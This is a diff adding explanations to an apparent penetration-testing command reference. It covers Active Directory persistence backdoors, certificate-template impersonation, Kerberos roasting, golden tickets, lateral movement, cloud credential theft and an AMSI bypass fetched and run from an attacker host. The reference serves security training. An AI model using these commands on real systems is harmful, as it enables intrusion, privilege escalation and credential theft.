@@ -200,7 +200,8 @@ const COMMAND_DATA = {
           "label": "Check Event 4725 - user account disabled (honeypot response)",
           "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4725} | Select -First 10 | Format-List"
         }
-      ]
+      ],
+      "explain": "Enumerates GPO ACLs to find policies a non-admin can modify (and thus weaponize):\n  Get-DomainGPO             list all GPOs\n  | Get-ObjectAcl -ResolveGUIDs   read each GPO's ACL with readable right names\n  | Where-Object {...SecurityIdentifier -ne '<domain_controllers_sid>'}   drop the expected DC entries so attacker-writable ACEs stand out\nA writable GPO lets you push a scheduled task/registry change to every computer in its OU. Detect via Event 5136 on CN=Policies objects."
     },
     {
       "id": "crtp-race-backdoors",
@@ -339,7 +340,8 @@ const COMMAND_DATA = {
           "MITRE T1098",
           "MITRE T1546"
         ]
-      }
+      },
+      "explain": "Drops stealthy DACL-based remote-access backdoors so a chosen low-priv user keeps access with no new accounts:\n  Set-RemoteWMI             edit the security descriptor so <user> can query WMI remotely\n  -SamAccountName <user>   the principal granted access\n  -ComputerName <host>     the machine backdoored (e.g. the DC)\n  -namespace 'root\\cimv2'  the WMI namespace to open up\n  -Verbose                  show what it changes\nCompanion functions do the same for PSRemoting (Set-RemotePSRemoting) and remote registry (Add-RemoteRegBackdoor, which also reads the machine hash)."
     },
     {
       "id": "crtp-acl-persistence",
@@ -459,7 +461,8 @@ const COMMAND_DATA = {
           "label": "AD Module - Set-ADACL GUIDRight DCSync",
           "command": "Set-ADACL -SamAccountName <user> -DistinguishedName 'DC=<domain>' -GUIDRight DCSync -Verbose"
         }
-      ]
+      ],
+      "explain": "Grants a controlled low-priv user DCSync rights via WriteDACL/GenericAll, a backdoor that survives password resets:\n  Add-DomainObjectAcl       write an ACE onto an object\n  -TargetIdentity 'DC=<domain>,DC=local'   the domain root (where replication rights live)\n  -PrincipalIdentity '<user>'   the account you keep control of\n  -Rights DCSync           the DS-Replication-Get-Changes(-All) rights\nAfterwards that ordinary user can DCSync the domain at will (verify with lsadump::dcsync /user:krbtgt) - no group membership to notice."
     },
     {
       "id": "ad-admodule-spn",
@@ -1318,7 +1321,8 @@ const COMMAND_DATA = {
           "label": "EA impersonation via /altname",
           "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator"
         }
-      ]
+      ],
+      "explain": "Requests a certificate from an ESC1 template (enrollee supplies the subject) to impersonate any user:\n  request                   enroll a certificate\n  /ca:<ca_server>\\<ca_name> the issuing CA to submit to\n  /template:<template_name> the ENROLLEE_SUPPLIES_SUBJECT template\n  /altname:<user>           the account to impersonate (set to Administrator for DA)\nYou receive a cert as that user; convert PEM to PFX and feed it to Rubeus asktgt to PKINIT and get their TGT (/ptt injects it)."
     },
     {
       "id": "ad-esc1-certipy-linux",
@@ -1425,7 +1429,8 @@ const COMMAND_DATA = {
           "a": "With Full Enforcement, DCs require a strong SID binding, so a UPN/SAN-only cert is rejected. You adapt by supplying the target's SID in the request (certipy -sid) when you can, or pivot to ESC16 where the CA drops the SID extension entirely.",
           "role": "both"
         }
-      ]
+      ],
+      "explain": "Requests a certificate from an ESC1-vulnerable template (one that lets the enrollee supply the Subject Alternative Name) so you impersonate a privileged user:\n  req                       request/enroll a certificate\n  -u <user>@<domain> -p <password>   authenticate as your low-priv account\n  -dc-ip <dc_ip>            the Domain Controller\n  -ca <ca_name>             the issuing Certificate Authority\n  -template <vuln_template> the ENROLLEE_SUPPLIES_SUBJECT template\n  -upn administrator@<domain>   the identity to bake into the cert's SAN\nYou get a .pfx for administrator; use it with certipy auth to PKINIT and recover that account's TGT/NT hash."
     },
     {
       "id": "ad-esc16-upn-manipulation",
@@ -1537,7 +1542,8 @@ const COMMAND_DATA = {
           "a": "Detect via Event 5136 changes to userPrincipalName (set to a privileged name then reverted) correlated with CA enrollment (4886/4887) and PKINIT logon (4768). Prevent by re-enabling the SID security extension on the CA, enforcing strong certificate mapping on DCs (KB5014754 Full Enforcement), restricting UPN write access, and treating CA hosts as Tier-0.",
           "role": "soc"
         }
-      ]
+      ],
+      "explain": "Rewrites a controlled account's UPN to a privileged target, abusing an ESC16 CA that globally omits the SID security extension:\n  account update            modify a directory account's attributes\n  -u <user>@<domain> -p <password>   authenticate\n  -dc-ip <dc_ip>            the Domain Controller\n  -user <controlled_account>   the account whose userPrincipalName you rewrite (you must have write over it)\n  -upn administrator        the privileged UPN to impersonate\nAfter this, enroll a client-auth cert as that account and PKINIT: because the SID extension is missing, the DC maps the cert to administrator by UPN. Reset the UPN afterward."
     },
     {
       "id": "crtp-adcs-esc3",
@@ -1657,7 +1663,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Enrollment agent certificate template accessible to Domain Users. Templates allowing enrollment agent to supply subject. No CA Manager Approval on enrollment agent issuance. CA auditing not enabled.",
         "vulnerable_config": "# ESC3 requires two vulnerable templates:\n# Template 1: Enrollment Agent (Certificate Request Agent EKU) - accessible to Domain Users\n# Template 2: User template - allows Enrollment Agent to enroll on behalf of others\n\nCertify.exe find /vulnerable\n# [ESC3] Enrollment Agent Certificate:\n# Template: ESC3-CertRequestAgent\n# Enrollment: Domain Users\n# EKU: Certificate Request Agent\n# [ESC3] Template allowing enrollment agent:\n# Template: User\n# Enrollment: Domain Users\n# No enrollment agent restriction",
         "secure_config": "# Restrict enrollment agent template to CA admins only:\n# Certificate Templates → ESC3-CertRequestAgent → Security\n# Remove 'Domain Users' enrollment permission\n# Add only 'CA Administrators' or specific smart card enrollment station accounts\n\n# Require Manager Approval on all enrollment agent issuances:\n# Template Properties → Issuance Requirements\n# → 'This number of authorized signatures': 1\n# → 'Application policy': Certificate Request Agent\n# → CA certificate manager approval: CHECK\n\n# Audit enrollment agent certificate usage:\n# CA audit Event 4887 → filter for Certificate Request Agent EKU in certificate chain"
-      }
+      },
+      "explain": "Step 1 of the ESC3 chain - obtain an Enrollment Agent certificate:\n  request                          enroll a certificate\n  /ca:<ca_server>\\<ca_name>        the issuing CA\n  /template:<enrollment_agent_template>   a template granting the Certificate Request Agent EKU\nWith the resulting EA cert you then enroll on behalf of any user (/onbehalfof:<domain>\\Administrator /enrollcert:ea_cert.pfx) against a second template, then Rubeus asktgt to get that user's TGT."
     },
     {
       "id": "ad-find-domainshare",
@@ -2099,7 +2106,8 @@ const COMMAND_DATA = {
         "splunk_spl": "index=sysmon EventCode=1 ParentImage=\"*mmc.exe\" (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\")\n| table _time, Computer, User, Image, CommandLine, ParentImage\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4624 Logon_Type=3\n| where Logon_Process=\"NtLmSsp\" AND Process_Name=\"*mmc.exe\"\n| table _time, Account_Name, Source_Network_Address",
         "elastic_kql": "event.code:\"1\" AND process.parent.executable:*mmc.exe AND (process.name:cmd.exe OR process.name:powershell.exe)\n\nevent.code:\"4624\" AND winlog.event_data.LogonType:\"3\" AND process.name:*mmc.exe",
         "sigma_rules": "proc_creation_win_dcom_lateral_movement"
-      }
+      },
+      "explain": "Lateral movement via DCOM by driving a remote COM object (needs local admin on the target):\n  [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))   remotely instantiate the MMC20.Application object over RPC (port 135)\n  $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c <payload>\",\"7\")   use its ExecuteShellCommand method to run your command\nExecution happens under the DCOM object's process - stealthier than psexec since no service is created."
     },
     {
       "id": "ad-wmi-cim-exec",
@@ -2212,7 +2220,8 @@ const COMMAND_DATA = {
           "https://attack.mitre.org/techniques/T1047/",
           "https://attack.mitre.org/techniques/T1021/006/"
         ]
-      }
+      },
+      "explain": "Executes commands on remote Windows hosts over WMI/WinRS:\n  wmic /node:<target>      run against this remote host over DCOM/RPC (port 135 + dynamic range)\n  /user:<domain>\\<user> /password:<pass>   the credentials\n  process call create \"<cmd>\"   spawn the process remotely\nThe second line shows the WinRS equivalent (winrs -r:<target> ... over WinRM 5985) - use whichever protocol the environment permits."
     },
     {
       "id": "crtp-ad-module-enum",
@@ -2361,7 +2370,8 @@ const COMMAND_DATA = {
           "label": "Ping sweep via AD Module",
           "command": "Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}"
         }
-      ]
+      ],
+      "explain": "Uses the signed Microsoft ActiveDirectory module (stealthier than PowerView, it is legitimate admin tooling) to enumerate the domain:\n  Get-ADDomain             pull core domain facts\n  | select DNSRoot,NetBIOSName,DomainSID,PDCEmulator   the name, SID, and PDC you need for later attacks\nSwap the cmdlet to map targets: Get-ADUser -Filter for Kerberoastable/AS-REP accounts, Get-ADGroupMember 'Domain Admins' -Recursive, Get-ADTrust for trusts."
     },
     {
       "id": "crtp-ad-filter-queries",
@@ -2482,7 +2492,8 @@ const COMMAND_DATA = {
           "label": "PowerView equivalents",
           "command": "Get-DomainUser -PreauthNotRequired; Get-DomainComputer -Unconstrained; Get-DomainUser -AdminCount"
         }
-      ]
+      ],
+      "explain": "A set of LDAP / AD-module filter queries that pinpoint attack targets without noisy full dumps. The lead example finds AS-REP roastable accounts:\n  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}   accounts with pre-auth disabled\n  -Properties DoesNotRequirePreAuth   include that attribute in the output\nOther queries in the set cover Kerberoastable (servicePrincipalName=*), disabled accounts (userAccountControl bitwise), adminCount=1, Protected Users, and OU-scoped searches - each returns just the principals worth attacking."
     },
     {
       "id": "ad-adidnsdump",
@@ -2701,7 +2712,8 @@ const COMMAND_DATA = {
           "label": "Abuse - reset a protected user's password",
           "command": "Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Verbose"
         }
-      ]
+      ],
+      "explain": "Backdoors AdminSDHolder so its ACL propagates to every protected group via SDProp:\n  Add-DomainObjectAcl       write an ACE\n  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=local'   the template object whose DACL SDProp copies out\n  -PrincipalIdentity '<user>'   the account you control\n  -Rights All              GenericAll (or WriteMembers/ResetPassword)\nEvery ~60 min SDProp stamps this ACL onto Domain Admins/Enterprise Admins/Administrators, so <user> can re-grant itself DA - persistent even after cleanup of the groups themselves. Invoke-SDPropagator forces it immediately."
     },
     {
       "id": "cdsa-m12-yara-advanced",
@@ -2918,7 +2930,8 @@ const COMMAND_DATA = {
           "label": "Install the malicious MSI as SYSTEM",
           "command": "msiexec /quiet /qn /i c:\\path\\aie.msi"
         }
-      ]
+      ],
+      "explain": "Installs a payload MSI as SYSTEM when AlwaysInstallElevated is enabled:\n  msiexec /i c:\\path\\aie.msi   install the MSI package\n  /quiet /qn /norestart    silent, no UI, no reboot\nRequires the AlwaysInstallElevated key set to 1 in BOTH HKCU and HKLM. Build the MSI with msfvenom -f msi (or PowerUp's Write-UserAddMSI); it runs with SYSTEM rights."
     },
     {
       "id": "crtp-amsi-sbl-bypass",
@@ -3033,7 +3046,8 @@ const COMMAND_DATA = {
           "MITRE T1562.001",
           "MITRE T1059.001"
         ]
-      }
+      },
+      "explain": "Downloads and executes an in-memory patch that blinds PowerShell defenses before you load tooling:\n  iex (New-Object System.Net.WebClient).DownloadString('...')   fetch the bypass text and run it in this session, nothing touches disk\n  http://<attacker_ip>/<amsi_bypass>.txt   your hosted one-liner (CRTP serves sbloggingbypass.txt and Amsi-Byp.txt)\nAfter it runs, AMSI (AmsiScanBuffer) and Script Block Logging are disabled for the session, so you can iex PowerView/Mimikatz without alerts."
     },
     {
       "id": "amsi-bypass",
@@ -3570,7 +3584,8 @@ const COMMAND_DATA = {
         "ffuf",
         "credential",
         "json"
-      ]
+      ],
+      "explain": "Brute-forces a JSON REST login endpoint with ffuf's multi-wordlist mode:\n  -w <pwlist>:PASS -w <userlist>:EMAIL   two wordlists bound to the PASS and EMAIL placeholders\n  -u http://<target>/api/v1/authentication/<role>/sign-in   the endpoint\n  -X POST -H \"Content-Type: application/json\"   POST a JSON body\n  -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}'   the body with placeholders substituted\n  -fr \"Invalid Credentials\"   filter out failure responses, keeping only successes\n  -t 100                   100 threads\nThe API-native equivalent of form brute forcing; variations brute a known email, an OTP, or a change-password field."
     },
     {
       "id": "api-version-enum",
@@ -4285,7 +4300,8 @@ const COMMAND_DATA = {
           "label": "Crack AS-REP (hashcat m18200)",
           "command": "hashcat -m 18200 <hashfile> <wordlist>"
         }
-      ]
+      ],
+      "explain": "Roasts every account with Kerberos pre-auth disabled - no credentials needed:\n  asreproast               request AS-REP responses for all UF_DONT_REQUIRE_PREAUTH accounts (add /user:<user> to target one)\n  /format:hashcat          emit in hashcat crackable format\n  /nowrap                  do not line-wrap the hash (one line, easy to copy)\n  /outfile:asrep_hashes.txt save the hashes\nCrack offline with hashcat -m 18200 to recover the account passwords."
     },
     {
       "id": "cdsa-m06-asreproasting",
@@ -4384,7 +4400,8 @@ const COMMAND_DATA = {
           "label": "Crack",
           "command": "hashcat -m 18200 asrep.txt rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Rubeus roasts accounts with Kerberos pre-auth disabled, no credentials needed:\n  asreproast               request AS-REP responses for every UF_DONT_REQUIRE_PREAUTH account (add /user:<user> for one)\n  /outfile:asrep.txt       save the crackable hashes\nCrack offline with hashcat -m 18200. Defensively, this shows up as Event 4768 with Pre-Auth Type 0 and RC4 (0x17)."
     },
     {
       "type": "attack-chain",
@@ -4765,7 +4782,8 @@ const COMMAND_DATA = {
           "CRTP",
           "MITRE T1187"
         ]
-      }
+      },
+      "explain": "Forces a remote machine (often a DC) to authenticate to a host you control:\n  MS-RPRN.exe               trigger the Print System 'printerbug' RPC (RpcRemoteFindFirstPrinterChangeNotification)\n  \\\\<target_dc_fqdn>       the victim you coerce (it will authenticate outbound)\n  \\\\<listener_host_fqdn>   where it authenticates TO - your listener\nPoint it at an unconstrained-delegation host running Rubeus monitor to capture the DC's TGT, or at ntlmrelayx to relay. DFSCoerce/WSPCoerce are alternatives when the print service is disabled."
     },
     {
       "id": "av-evasion-methods",
@@ -5240,7 +5258,8 @@ const COMMAND_DATA = {
         "misconfiguration": "ECR repositories public or accessible to all account roles. ECS task roles over-permissioned (admin-level). EKS with anonymous auth enabled. No ECR image scanning. Secrets hardcoded in container images.",
         "vulnerable_config": "# Over-permissioned ECS task role:\naws iam get-role-policy --role-name ecs-task-role --policy-name task-policy\n# → Action: '*', Resource: '*' (admin role on ECS task)\n\n# ECS task metadata credentials (from within container):\ncurl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n# → AccessKeyId: ASIA..., SecretAccessKey: ..., Token: ... (temporary creds)\n# → These creds have the ECS task role permissions = admin if misconfigured",
         "secure_config": "# Least-privilege ECS task roles:\n# Only grant permissions the container actually needs:\n# Application reads from S3? Only: s3:GetObject on specific bucket\n# Application writes to DynamoDB? Only: dynamodb:PutItem on specific table\n\n# ECR private with scanning:\naws ecr put-image-scanning-configuration --repository-name myapp --image-scanning-configuration scanOnPush=true\n\n# EKS: disable anonymous auth:\n# kube-apiserver flag: --anonymous-auth=false\n# Or use EKS managed addon with aws-auth ConfigMap\n\n# Secrets in containers: use Secrets Manager:\n# AWS Secrets Manager + ECS: inject via environment variable at task launch\n# EKS: use AWS Secrets Store CSI Driver"
-      }
+      },
+      "explain": "Enumerates a container you landed in (e.g. via pipeline RCE) to find escape and credential paths:\n  cat /proc/mounts | grep overlay   confirm you are in a container (overlay root filesystem)\n  cat /proc/1/status | grep Cap     read the container's Linux capability bitmasks\n  capsh --decode=<hex_value>        turn a Cap bitmask into named capabilities (spot dangerous ones like SYS_ADMIN)\n  env | grep -i aws ; printenv      look for AWS keys leaked into the environment\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/   query the instance metadata service for IAM role creds\nTogether these reveal whether you can escape the container or assume a cloud role."
     },
     {
       "id": "aws-s3-ec2-public-enum",
@@ -6346,7 +6365,8 @@ const COMMAND_DATA = {
         "misconfiguration": "S3 Block Public Access not enabled at account level. Bucket ACL or policy grants public read. Developer committed .env or AWS credentials to git repo. No secret scanning in CI/CD pipeline. S3 access logging not enabled.",
         "vulnerable_config": "# Public bucket check:\naws s3api get-bucket-acl --bucket vulnerable-bucket\n# → Grants: [{Grantee: {Type: Group, URI: AllUsers}, Permission: READ}]\n# → World-readable bucket\n\n# Block Public Access disabled:\naws s3api get-public-access-block --bucket vulnerable-bucket\n# → All 4 flags: false = no protection\n\n# Developer committed credentials:\n# .env file in bucket: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
         "secure_config": "# Enable S3 Block Public Access at account level (prevents all public S3):\naws s3control put-public-access-block --account-id ACCOUNT_ID --public-access-block-configuration \\\n  'BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true'\n\n# Secret scanning in git:\n# .github/workflows/secret-scan.yml:\n# - uses: gitleaks/gitleaks-action@v2\n\n# Pre-commit hook:\n# pip install pre-commit detect-secrets\n# .pre-commit-config.yaml:\n# - repo: https://github.com/Yelp/detect-secrets\n\n# Use Secrets Manager instead of .env:\nimport boto3\nclient = boto3.client('secretsmanager')\nsecret = client.get_secret_value(SecretId='prod/db/password')['SecretString']"
-      }
+      },
+      "explain": "Loots an S3 bucket and mines any git history it contains for secrets:\n  aws --profile <profile> s3 sync s3://<bucket_name> ./<local_dir>/   download the whole bucket\n  git log ; git show <commit_hash>   inspect commit history and specific commits\n  gitleaks detect --source . --verbose   scan the repo for API keys, passwords, tokens\nSecrets 'deleted' in a later commit still live in history, so a synced .git directory often yields working credentials."
     },
     {
       "id": "aws-terraform-state",
@@ -6476,7 +6496,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Terraform state S3 bucket accessible to all developers (not just CI/CD role). State bucket does not require encryption. No S3 access logging on state bucket. Terraform resources with plaintext sensitive values.",
         "vulnerable_config": "# State bucket accessible to all developers:\naws s3api get-bucket-policy --bucket tf-state-bucket\n# → Principal: arn:aws:iam::ACCOUNT:role/developer (has GetObject)\n# → State file readable by all developer roles\n\n# Sensitive data in state:\naws s3 cp s3://tf-state-bucket/prod/terraform.tfstate - | \\\n  python3 -c 'import sys,json; s=json.load(sys.stdin); \\\n  [print(r[\"type\"],r.get(\"primary\",{}).get(\"attributes\",{})) for r in s.get(\"resources\",[])]'\n# → db_password: SuperSecret123 in plaintext",
         "secure_config": "# Restrict state bucket to CI/CD role only:\n# S3 bucket policy:\n# {\n#   'Effect': 'Allow',\n#   'Principal': {'AWS': 'arn:aws:iam::ACCOUNT:role/TerraformExecution'},\n#   'Action': ['s3:GetObject', 's3:PutObject'],\n#   'Resource': 'arn:aws:s3:::tf-state-bucket/*'\n# }\n# Default: deny everyone else\n\n# Enable state encryption:\n# terraform backend config:\n# backend \"s3\" {\n#   bucket         = \"tf-state-bucket\"\n#   key            = \"prod/terraform.tfstate\"\n#   region         = \"us-east-1\"\n#   encrypt        = true\n#   kms_key_id     = \"arn:aws:kms:us-east-1:ACCOUNT:key/KEY_ID\"\n# }\n\n# Use Secrets Manager - don't embed in Terraform:\n# data \"aws_secretsmanager_secret_version\" \"db_pass\" {\n#   secret_id = \"prod/rds/password\"\n# }"
-      }
+      },
+      "explain": "Finds and loots Terraform state files in S3, which store provisioned resources in cleartext:\n  s3api list-buckets --query 'Buckets[?contains(Name, `tf-state`) || contains(Name, `terraform`)].Name'   find state buckets by name\n  s3 cp s3://<tf-state-bucket>/terraform.tfstate ./   download the state file\n  python3 -c \"... if 'AKIA' in r or len(r)==40\"   grep the JSON for AWS access key IDs (AKIA...) and 40-char secret keys\n.tfstate routinely contains plaintext IAM keys, DB passwords, and other secrets."
     },
     {
       "id": "aws-cli-setup",
@@ -6924,7 +6945,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Over-privileged managed identity (e.g., Contributor at subscription scope) on an internet-facing VM/app; SSRF that can set request headers.",
         "vulnerable_config": "# MI with Contributor at subscription, app has SSRF -> attacker sets Metadata header via SSRF:\n# GET http://169.254.169.254/metadata/identity/oauth2/token?...&resource=https://management.azure.com/ (Metadata:true)",
         "secure_config": "# Scope the managed identity to least privilege (specific resource group / resource).\n# Block workload egress to 169.254.169.254 where the app does not need IMDS.\n# Remediate SSRF (egress allowlist, block link-local); alert on MI anomalies in Activity Log."
-      }
+      },
+      "explain": "Steals an Azure VM's managed-identity token from the Instance Metadata Service:\n  curl -H \"Metadata:true\"   the required IMDS header\n  \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"   request an ARM access token for the VM's managed identity\nFrom code execution on the VM, this returns a bearer token; use it against the Azure APIs as that identity, which frequently holds RBAC roles."
     },
     {
       "id": "azure-arm-enum",
@@ -7138,7 +7160,8 @@ const COMMAND_DATA = {
           "MITRE T1078.002"
         ],
         "evasion": "Copy the hives/ntds via the shadow copy, parse OFFLINE, and remove the shadow copy + copied files after."
-      }
+      },
+      "explain": "Abuses Backup Operators' SeBackupPrivilege (which bypasses file ACLs on read) to copy any protected file:\n  Copy-FileSeBackupPrivilege   copy using the backup semantics that ignore the DACL\n  '<protected_file>'       the file you cannot normally read\n  .\\out.txt                the local copy\nImport the SeBackupPrivilege cmdlets and enable the privilege first; then read otherwise-denied files (configs, hive backups, flags)."
     },
     {
       "type": "command",
@@ -7247,7 +7270,8 @@ const COMMAND_DATA = {
           "MITRE T1078.002"
         ],
         "evasion": "Copy the hives/ntds via the shadow copy, parse OFFLINE, and remove the shadow copy + copied files after."
-      }
+      },
+      "explain": "Extracts the AD database on a DC using SeBackupPrivilege plus a shadow copy:\n  diskshadow.exe           script a Volume Shadow Copy of C: (works around the NTDS lock)\nThen Copy-FileSeBackupPrivilege the NTDS.dit off the snapshot and reg save the SYSTEM hive; run impacket-secretsdump -ntds -system LOCAL to dump every domain hash offline. Backup Operators on a DC = domain compromise."
     },
     {
       "type": "command",
@@ -7787,7 +7811,8 @@ const COMMAND_DATA = {
           "label": "SOAPHound - dump BloodHound data",
           "command": "SOAPHound.exe -c <cache_file> --bhdump -o <output_dir> --nolaps"
         }
-      ]
+      ],
+      "explain": "Runs the SharpHound collector to gather AD relationship data for BloodHound path analysis:\n  Invoke-BloodHound       the SharpHound.ps1 collection function\n  -CollectionMethod All   collect sessions, ACLs, group membership, trusts, delegation, etc.\n  -OutputDirectory C:\\Temp\\   where to drop the zip\n  -OutputPrefix 'crtp'    prefix for the output files\nImport the resulting zip into BloodHound to see shortest paths to Domain Admin, unconstrained hosts, and ACL abuse edges."
     },
     {
       "id": "ad-bloodhound-cypher",
@@ -7846,7 +7871,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "bloodhound"
-      ]
+      ],
+      "explain": "A set of raw Cypher queries you paste into the BloodHound CE Neo4j console to surface attack paths the GUI does not show by default:\n  MATCH (u:User {owned:true})   start from accounts you have already marked as owned\n  shortestPath(...->(t:Group {highvalue:true}))   the fewest hops to a high-value group (e.g. Domain Admins)\n  RETURN p                       render that path as a graph\nOther queries in the set list outbound control edges, Kerberoastable/AS-REP-roastable users, shadow-credential and RBCD opportunities, and DCSync principals - so you pick the next abuse from live graph data instead of guessing."
     },
     {
       "id": "ad-neo4j-bloodhound",
@@ -8121,7 +8147,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "bloodyAD"
-      ]
+      ],
+      "explain": "bloodyAD is a Linux tool that enumerates and abuses AD objects directly over LDAP:\n  --host <dc_ip>            the Domain Controller / LDAP server to talk to\n  -d <domain>              the AD domain\n  -u <user> -p <password>  authenticate (also accepts -k for Kerberos or an NT hash)\n  get writable             list every object your account can write to\nSwap the action (set password, add groupMember, add dcsync, add shadowCredentials, set object) to turn a discovered write right into an actual takeover, no Windows host needed."
     },
     {
       "id": "auth-2fa-brute",
@@ -9197,7 +9224,8 @@ const COMMAND_DATA = {
           "description": "Adds a symbols filter requiring 2+ special characters (!@#$%^&*) on top of the standard length/upper/lower/digit filters. Use when the target policy mandates special characters."
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Trims a wordlist to only candidates matching a known password policy:\n  grep -E '^.{8,}$' <wordlist>   keep entries of at least 8 characters\n  | grep -E '[A-Z]'        require an uppercase letter\n  | grep -E '[a-z]'        require a lowercase letter\n  | grep -E '[0-9]'        require a digit\n  > filtered.txt           the reduced list\nShrinking the keyspace to the target's complexity rules cuts crack time; chain another grep for symbol requirements."
     },
     {
       "id": "burp-intruder",
@@ -9628,7 +9656,8 @@ const COMMAND_DATA = {
           "MITRE T1548.001"
         ],
         "evasion": "Use the GTFOBins invocation that runs in-place without dropping files; clean up any temporary payloads; a single setuid abuse is quieter than repeated attempts."
-      }
+      },
+      "explain": "Enumerates file capabilities and abuses a high-value one:\n  find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f   scan the common binary dirs\n  -exec getcap {} \\;       print each file's capabilities\nCapabilities grant slices of root without SUID; e.g. a binary with cap_dac_override (like vim.basic) can rewrite /etc/passwd to blank root's password, then su -."
     },
     {
       "id": "cdsa-analyst-methodology",
@@ -9917,7 +9946,8 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "certipy"
-      ]
+      ],
+      "explain": "certipy-ad is the Linux Swiss-army knife for AD CS (certificate services) enumeration and abuse:\n  find                     enumerate CAs and templates\n  -u <user>@<domain> -p <password>   authenticate to the DC\n  -dc-ip <dc_ip>           the Domain Controller / LDAP target\n  -vulnerable              show only templates vulnerable to ESC1-ESC16\n  -stdout                  print results to the terminal instead of a file\nSwap the verb (req to enroll a cert, auth to PKINIT, shadow, account update) to escalate from a readable misconfiguration to a privileged TGT / NT hash."
     },
     {
       "id": "cewl-wordlist",
@@ -10013,7 +10043,8 @@ const COMMAND_DATA = {
           "label": "Harvest emails from the site",
           "command": "cewl <url> -d <depth> -e --email_file emails.txt -w wordlist.txt"
         }
-      ]
+      ],
+      "explain": "Builds a target-specific wordlist by crawling their website:\n  cewl <url>               spider this site\n  -d <depth>               crawl to this link depth\n  -m <min_length>          keep words at least this long\n  --lowercase              lowercase the output\n  -w wordlist.txt          save the harvested words\nGreat for org-specific candidates generic lists miss; --with-numbers keeps numeric words, -e also harvests emails."
     },
     {
       "id": "ad-printerbug-enum",
@@ -10247,7 +10278,8 @@ const COMMAND_DATA = {
           "label": "DCSync parent forest root after escalation",
           "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\""
         }
-      ]
+      ],
+      "explain": "Forges a cross-domain golden ticket that escalates from a child domain to the forest root:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>            the child domain's krbtgt hash (from DCSync)\n  /domain:<domain> /sid:<domain_sid>   the child domain and its SID\n  /sids:<parent_enterprise_admin_sid>  the parent Enterprise Admins SID (ends -519) injected into SID History\n  /user:Administrator /ptt  impersonate Administrator and inject the ticket\nSID History is not filtered inside a forest, so the ticket is honored on the parent DC - dir \\\\<parent_dc>\\C$ then DCSync the root."
     },
     {
       "id": "chisel-socks",
@@ -10812,7 +10844,8 @@ const COMMAND_DATA = {
           "label": "DCSync using injected DC TGT",
           "command": "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
         }
-      ]
+      ],
+      "explain": "Runs Rubeus in monitor mode on an unconstrained-delegation server to catch inbound TGTs:\n  monitor                   watch LSASS for newly cached Kerberos TGTs\n  /interval:1               poll every second\n  /nowrap                   single-line base64 ticket output\nCoerce a DC to authenticate here (Coercer.py); its TGT gets cached and captured, then ptt it and DCSync as the DC. Detect via Event 4768/4769 spikes plus the coercion RPC traffic."
     },
     {
       "id": "coldfusion-directory-traversal",
@@ -12301,7 +12334,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Service accounts with constrained delegation to powerful services (ldap/dc01, cifs/dc01, host/dc01). Account not protected as sensitive. Delegation to HOST SPN - grants full code execution on the target host.",
         "vulnerable_config": "# Accounts with constrained delegation:\nGet-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo | Select-Object Name,msDS-AllowedToDelegateTo\n# svc_web - AllowedToDelegateTo: [ldap/DC01.corp.local] → can impersonate DA to DC LDAP\n\nGet-ADComputer -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo",
         "secure_config": "# Mark sensitive accounts non-delegatable:\nGet-ADGroupMember 'Domain Admins' | ForEach-Object {\n  Set-ADAccountControl $_ -AccountNotDelegated $true\n}\n\n# Replace constrained delegation with RBCD (more controlled):\nClear-ADAccountAttribute -Identity svc_web -Attribute msDS-AllowedToDelegateTo\n# Then set RBCD on the target resource instead of the service account\n\n# Use gMSA for delegation-capable service accounts:\nNew-ADServiceAccount -Name 'svc_web_gmsa' -DNSHostName 'web.corp.local' -PrincipalsAllowedToRetrieveManagedPassword 'WEB01$'\n\n# SIEM: alert on S4U delegation from non-expected accounts:\n# EventID=4769 AND TicketOptions=0x50800000 (includes forwardable via S4U) AND ServiceName != expected_service → ALERT"
-      }
+      },
+      "explain": "Abuses msDS-AllowedToDelegateTo (constrained delegation) to impersonate any user to the allowed service:\n  s4u                       run S4U2Self + S4U2Proxy\n  /user:<user>             the account trusted for delegation (its identity)\n  /rc4:<nt_hash>           that account's hash to authenticate\n  /impersonateuser:Administrator   the user to impersonate (S4U2Self)\n  /msdsspn:'<spn>'         the service it is allowed to delegate to\n  /nowrap                   single-line ticket output\nInject the resulting service ticket (Rubeus ptt) to access that SPN as Administrator; /altservice swaps the service class (e.g. to ldap for DCSync)."
     },
     {
       "id": "coreftp-path-traversal",
@@ -12712,7 +12746,8 @@ const COMMAND_DATA = {
